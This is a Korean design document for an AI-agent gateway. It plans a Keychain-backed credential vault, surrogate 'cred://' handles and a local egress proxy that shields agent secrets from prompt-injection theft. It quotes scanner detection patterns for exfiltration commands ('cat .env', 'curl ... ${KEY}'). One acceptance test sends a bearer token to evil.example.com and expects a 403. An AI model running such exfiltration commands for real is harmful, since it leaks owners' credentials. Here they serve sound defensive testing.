# 자격증명(Credentials) 벤치마킹 및 도입 설계서

## 판정

**채택(adopt now)** — 부분 채택(macOS Keychain 연동 vault + surrogate token 핸들 + 로컬 egress 프록시 주입). 단, AWS Nitro Enclave나 S3 Object Lock 등 클라우드 하드웨어 격리 인프라는 단일 오너의 로컬 Mac 데몬 환경에 부적합하므로 명확히 제외한다.

오너 1인의 Mac 워크스테이션에서 구동되는 게이트웨이 특성상, 에이전트(omo app-server 및 하위 작업자)가 Discord 봇 토큰, OpenAI/Anthropic API 키, 슬랙 토큰, 외부 서비스 비밀번호를 직접 평문으로 읽거나 환경변수로 상속받는 것은 프롬프트 인젝션 및 도구 오남용 시 치명적인 유출 위험을 낳는다. 반면 에이전트에게는 불투명한 핸들(`cred://<id>`)만 부여하고, 실제 외부 호출은 게이트웨이가 관리하는 로컬 egress 프록시에서 호스트/경로/메소드 화이트리스트 검증 및 해시 체인 감사 기록 후 주입하는 패턴은 단일 오너의 안전성과 자동화 확장성(외부 API 및 향후 커넥터 연동)을 동시에 충족한다.

---

## 벤치마킹 원천

| 플랫폼 / 기술 | 핵심 패턴 및 메커니즘 | 출처 태그 및 증거 |
|---|---|---|
| **Meta Muse** | **Surrogate Token 및 네트워크 경계 주입**<br>- 에이전트는 평문 비밀 대신 surrogate token만 보유<br>- Sentinel 승인 통과 시 네트워크 egress 경계에서 진짜 토큰으로 치환<br>- Ars Technica 0-day 사례(dictation 엔드포인트 탈취로 계정 토큰 유출)에서 드러난 로컬 제어 평면 하드닝 교훈: 로컬 설정·토큰 변경 권한 엄격 분리 | `[1차]` security.muse.ai, `wave2/muse-security.md` (Ars Technica 0-day 및 Meta 보안 백서 분석) |
| **Pickle** | **Nitro Enclave `forward` 및 Egress Policy**<br>- `pickle-com/credential-enclave` 오픈소스(Rust, Apache-2.0)<br>- 전송 서명: `{"body": b64u(bytes), "sig": b64u(sig)}`<br>- `expose_secret` 호출 지점을 K1~K7 및 `egress/*.tsv` 화이트리스트로 봉인하고 CI 감사 스크립트(`secret-access.sh`)로 강제<br>- Canary Test: 응답 본문에 비밀이 base64, hex, percent 인코딩으로 반사되면 `response_withheld`로 차단<br>- WORM 해시 체인 로그: `entry_hash = SHA256("pickle.secure.v1.log-chain\n" \|\| body)`로 순차 기록 | `[1차]` `github.com/pickle-com/credential-enclave` (`2dcf8957a4afb78a1c0400e3d37df0053faa97ad`), `wave2/pickle-enclave.md` |
| **OpenAI Dots** | **Secure sign-in**<br>- 모델을 일시 정지(pause)시킨 상태에서 브라우저 컨텍스트에 직접 자격증명을 입력<br>- LLM context window 및 세션 메모리에 비밀이 영구히 남지 않도록 차단 | `[1차]` Dots platform doc, `autonomous-agent-platform-plan.md` 3절 |
| **Hark** | **Tokenized Vault**<br>- "Secured by Hark" vault를 통해 자격증명을 토큰화하여 에이전트에 노출하지 않는다고 주장 | `[미검증]` 벤더 마케팅 주장, `wave2/payments-creds.md` |
| **Bitwarden / 1Password** | **Agent Access SDK / Secure Agent Access**<br>- 패스워드 매니저 기반의 세분화된 에이전트 서비스 계정 권한 부여 | `[2차]` `wave1/x-credentials.md` (HN 및 발표 자료) |

---

## 현재 코드

omon-gateway의 현재 코드베이스는 자격증명 중앙 저장소(Vault)나 egress 프록시 없이, 환경변수 직접 주입과 사후 정규식 마스킹에 의존하고 있다.

1. **환경변수 직접 파싱 및 평문 메모리 적재**
   - `src/main.rs:131-147`: `DISCORD_BOT_TOKEN`, `DISCORD_BOT_TOKENS` 환경변수를 쉼표로 분리해 프로세스 메모리(`Vec<String>`)에 직접 적재.
   - `src/main.rs:194-197`: `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`를 환경변수에서 읽어 인메모리 Config에 평문 보관.
   - `src/agent/omo_config.rs:41-43` & `src/agent/omo_config.rs:60-78`: `auth_token`에 대해 `#[serde(skip_serializing)]` 및 `Debug` 포맷 시 `"***"`로 마스킹 처리는 되어 있으나, 메모리 상에는 평문 스트링으로 상주.

2. **하위 프로세스 환경변수 박탈 (수동 블랙리스트)**
   - `src/tools/terminal.rs:709-720`: `is_secret_env_key` 함수가 `DISCORD_BOT_TOKEN`, `DISCORD_BOT_TOKENS`, `DISCORD_TOKEN`, `OMON_OMO_APPSERVER_AUTH_TOKEN` 및 `_BOT_TOKEN`, `_BOT_TOKENS`, `_APPSERVER_AUTH_TOKEN` 접미사만 선별 차단.
   - 한계: 임의의 외부 서비스 API 키(예: `GITHUB_TOKEN`, `SLACK_BOT_TOKEN`, AWS 키 등)는 자동으로 차단되지 않고 하위 프로세스에 누출될 수 있음.

3. **사후 정규식 스크러빙 및 정적 패턴 스캔**
   - `src/security/scan.rs:98-124`: 터미널 명령어 실행 전 `cat .env`, `cat credentials` 및 `curl ... ${KEY}`, `wget ...` 등 원시적인 환경변수 유출 패턴을 정규식으로 감지.
   - `src/judge/mod.rs:32-64`: 외부 LLM 판정 엔드포인트 호출 전 `scrub_with_cap`을 통해 홈 디렉터리(`~`) 및 `ghp_`, `sk-`, `xoxb-` 토큰 패턴을 `[REDACTED_TOKEN]`으로 치환.
   - `src/lanes/scrub.rs:26-38`: 레인 텍스트 출력 시 `GITHUB_TOKEN_RE`, `OPENAI_TOKEN_RE`, `SLACK_TOKEN_RE` 정규식을 활용해 후처리 마스킹.
   - 한계: 사후 텍스트 필터링 방식은 모델이 이미 프롬프트 내에서 비밀을 읽은 뒤 유출을 시도하는 공격(간접 프롬프트 인젝션, 분할 인코딩 유출)을 근본 차단하지 못함.

4. **MCP 및 외부 커넥터 부재**
   - `src/main.rs:1082`: `tools.register(McpTool::default());`로 등록되어 있으나,
   - `src/tools/mcp.rs:212-221`: `McpTool::default()`는 `clients: Vec::new()`(빈 벡터)로 초기화되어 사실상 더미 스텁 상태.
   - `src/inbox/sources/mail.rs:9-10`: `ACCOUNT = "freedomzero91@gmail.com"`이 소스 코드 내에 하드코딩되어 있으며 계정 자격증명 관리 추상화가 전무함.

5. **선행 계획서 내용 대조 및 정정**
   - 선행 계획서(`autonomous-agent-platform-plan.md` 6절 P2)에서는 `credentials(id, connector_id, keychain_ref, kind, expires_at, last_used_at)` 마이그레이션을 `0047`로 번호 매겼으나, 현재 저장소의 최신 마이그레이션은 `0044_tracker.sql`임. 후속 작업 순서에 따라 `0045` 또는 `0046`으로 부여되어야 함.
   - `Cargo.lock`에는 `rustls-native-certs`의 전이 의존성으로 `security-framework 3.7.0`이 존재하지만, `Cargo.toml`의 직접 의존성(`[dependencies]`)에는 아직 명시되지 않음.

---

## 구현 단계

### 1단계: macOS Keychain 연동 Vault 모듈 (`src/vault/`)
- **변경/생성 파일**:
  - `Cargo.toml`: `security-framework = "3.7"` 직접 의존성 추가 (macOS 타깃).
  - `src/vault/mod.rs`, `src/vault/keychain.rs`: 비밀 CRUD 추상화. `SecretString`은 `zeroize::Zeroize` 구현 및 `Serialize` 미구현(평문 직렬화 금지).
  - `src/vault/handle.rs`: `cred://<id>` 형태의 surrogate handle 파서 및 생성기.
- **DB 마이그레이션**:
  - `migrations/0045_credentials_vault.sql`:
    ```sql
    CREATE TABLE credentials (
        id TEXT PRIMARY KEY,
        name TEXT NOT NULL UNIQUE,
        service TEXT NOT NULL,
        account TEXT NOT NULL,
        keychain_service TEXT NOT NULL,
        keychain_account TEXT NOT NULL,
        kind TEXT NOT NULL, -- 'bearer', 'basic', 'api_key', 'oauth2'
        created_at TEXT NOT NULL DEFAULT (datetime('now')),
        last_used_at TEXT
    );
    ```
- **환경변수 킬스위치**: `OMON_CREDENTIALS_VAULT_ENABLED` (기본값: `false`)
- **기계 검증 인수 시나리오**:
  ```bash
  # CLI를 통해 Keychain에 테스트 시크릿 등록 후 메타데이터 DB 조회 확인
  omo-gateway credentials add --name "test-gh" --service "github" --account "indo" --secret "ghp_test_secret_12345"
  # 검증 쿼리: DB에는 메타데이터만 존재하고 실제 시크릿 문자열은 없어야 함
  sqlite3 ~/.omon/omon_gateway.db "SELECT id, name, service FROM credentials WHERE name='test-gh';" | grep "test-gh"
  # 보안 검증: DB 덤프에 평문 시크릿이 절대 존재하지 않아야 함
  sqlite3 ~/.omon/omon_gateway.db ".dump" | grep -v "ghp_test_secret_12345"
  ```

### 2단계: 로컬 Egress 프록시 및 대리 토큰(Surrogate) 주입 (`src/egress/`)
- **변경/생성 파일**:
  - `src/egress/mod.rs`, `src/egress/proxy.rs`: 데몬 내부 로컬 HTTP CONNECT / Forward 프록시 (`127.0.0.1:0` 동적 바인딩).
  - `src/egress/lease.rs`: 에이전트/레인별 권한 임대(Lease) 및 호스트/경로/메소드 검증기.
  - `src/egress/inspect.rs`: 요청 헤더 치환(`cred://<id>` -> 실제 토큰) 및 응답 카나리 검사(토큰 반사 시 차단).
  - `src/tools/terminal.rs`: 레인/작업자 실행 시 `HTTP_PROXY`, `HTTPS_PROXY` 환경변수 자동 주입 및 모든 `*_TOKEN`, `*_KEY` 환경변수 완전 차단.
- **DB 마이그레이션**:
  - `migrations/0046_egress_leases.sql`:
    ```sql
    CREATE TABLE egress_leases (
        id TEXT PRIMARY KEY,
        credential_id TEXT NOT NULL REFERENCES credentials(id),
        allowed_host TEXT NOT NULL,
        path_prefix TEXT NOT NULL,
        allowed_methods TEXT NOT NULL, -- JSON array: ["GET", "POST"]
        expires_at TEXT NOT NULL,
        revoked_at TEXT,
        created_at TEXT NOT NULL DEFAULT (datetime('now'))
    );
    CREATE TABLE credential_audit_log (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        credential_id TEXT NOT NULL,
        caller_session_id TEXT NOT NULL,
        destination_url TEXT NOT NULL,
        method TEXT NOT NULL,
        outcome TEXT NOT NULL, -- 'injected', 'denied_host', 'denied_method', 'leak_blocked'
        timestamp TEXT NOT NULL DEFAULT (datetime('now')),
        hash_chain TEXT NOT NULL
    );
    ```
- **환경변수 킬스위치**: `OMON_EGRESS_PROXY_ENABLED` (기본값: `false`)
- **기계 검증 인수 시나리오**:
  ```bash
  # 1. 허가된 엔드포인트로 surrogate 호출 시 200 성공 및 주입
  curl -x http://127.0.0.1:$PROXY_PORT -H "Authorization: Bearer cred://test-gh" https://api.github.com/user -s -o /dev/null -w "%{http_code}\n"
  # -> 기대값: 200 (또는 실제 토큰에 따른 응답)
  
  # 2. 비인가 호스트로 동일 surrogate 전송 시 403 차단 및 감사 로그 적재
  curl -x http://127.0.0.1:$PROXY_PORT -H "Authorization: Bearer cred://test-gh" https://evil.example.com/ -s -o /dev/null -w "%{http_code}\n"
  # -> 기대값: 403
  # 감사 로그 확인:
  sqlite3 ~/.omon/omon_gateway.db "SELECT outcome FROM credential_audit_log ORDER BY id DESC LIMIT 1;" | grep "denied_host"
  ```

### 3단계: 해시 체인 감사 원장 및 응답 유출 차단 (Canary Defense)
- **변경/생성 파일**:
  - `src/vault/audit.rs`: 불변 해시 체인 구현 (`entry_hash = SHA256(prev_hash || timestamp || credential_id || destination)`).
  - `src/egress/canary.rs`: 프록시 응답 스트림 검사기. 평문, base64, hex, urlencoded 형태의 토큰 문자열이 응답 본문에 포함될 경우 연결 즉시 리셋 및 502 Bad Gateway(Pickle의 `response_withheld` 대응).
- **환경변수 킬스위치**: `OMON_CREDENTIAL_CANARY_ENABLED` (기본값: `false`)
- **기계 검증 인수 시나리오**:
  ```bash
  # 로컬 에코 서버에서 요청 헤더(토큰)를 본문으로 반사할 때 프록시가 차단하는지 검증
  # 응답 코드 502 또는 빈 응답, 감사 로그에 'leak_blocked' 기록
  sqlite3 ~/.omon/omon_gateway.db "SELECT outcome FROM credential_audit_log WHERE outcome='leak_blocked';" | grep "leak_blocked"
  ```

---

## 위험·의존성

### 의존성 (관련 테마 ID)
1. **`sandbox` (전용 실행환경)**:
   - 에이전트의 터미널 명령어 및 하위 프로세스가 로컬 egress 프록시(`HTTPS_PROXY`)를 우회하여 직접 네트워크 소켓을 여는 행위를 방지하려면 네트워크 네임스페이스 또는 방화벽 격리가 수반되어야 함.
2. **`approval-effects` & `approval-grants` (효과 분류 및 승인)**:
   - 새로운 호스트나 민감한 외부 API로의 Credential Lease 발급 시, Discord 승인 루프를 통해 오너의 명시적 승인을 받아야 함.
3. **`mcp-connectors` (커넥터 및 외부 도구)**:
   - `src/tools/mcp.rs`의 외부 MCP 서버 연동 시 HTTP/SSE 헤더에 자격증명을 안전하게 공급하는 주입 계층으로 Vault가 직접 사용됨.
4. **`taint` (오염 추적)**:
   - 외부 수신 데이터(인박스, 웹 스크래핑)로 인해 오염된 세션이 민감 자격증명(`financial`, `admin`) 리스를 요청하지 못하도록 차단하는 게이트 연계 필요.
5. **`usage-ledger` (감사 및 사용 원장)**:
   - 자격증명 사용 이력(`credential_audit_log`)을 공통 실행 감사 원장에 연동하여 비용 및 작업 추적 가능하게 함.

### 주요 위험 및 대응책
- **macOS TCC 및 Keychain 접근 권한 충돌**:
  - launchd 데몬(`ai.omon.gateway`) 상태에서 macOS Keychain 접근 시 GUI 권한 팝업이 차단되거나 접근 거부가 발생할 수 있음.
  - **대응책**: 배포 시 이미 적용 중인 `Developer ID Application: Indo Yoon (5DUM8WPB4C)` 코드 서명을 유지하고, headless 데몬 전용 독립 키체인 파티션을 생성하거나 시스템 보안 프레임워크의 올바른 접근 권한(`kSecAttrAccessibleAfterFirstUnlock`)을 지정.
- **프록시 오버헤드 및 TLS MITM 신뢰성**:
  - HTTPS 트래픽 검사 및 헤더 주입을 위해 로컬 CA 인증서 생성 및 신뢰 등록이 필요하며, 이는 cURL, Python, Node.js 런타임별로 인증서 경로 설정 문제가 발생할 수 있음.
  - **대응책**: 초기 단계에서는 전체 MITM 프록시 대신, 게이트웨이 도구 계층(`WebFetchTool`, `McpTool`, 전용 `ApiCallTool`)에서 `cred://` 스키마를 직접 치환하여 발송하는 인프로세스 주입을 우선 적용하고, 쉘 직접 호출(`curl`)에 대해서만 투명 프록시를 점진 도입.
- **성능 및 순환 참조 방지**:
  - 게이트웨이가 스스로를 향해 요청하거나 OMO app-server 통신(`ws://127.0.0.1:19742`)이 프록시를 타서 데드락이 걸리지 않도록 `NO_PROXY=localhost,127.0.0.1` 및 사설 루프백 인터페이스 예외 처리를 엄격히 적용.
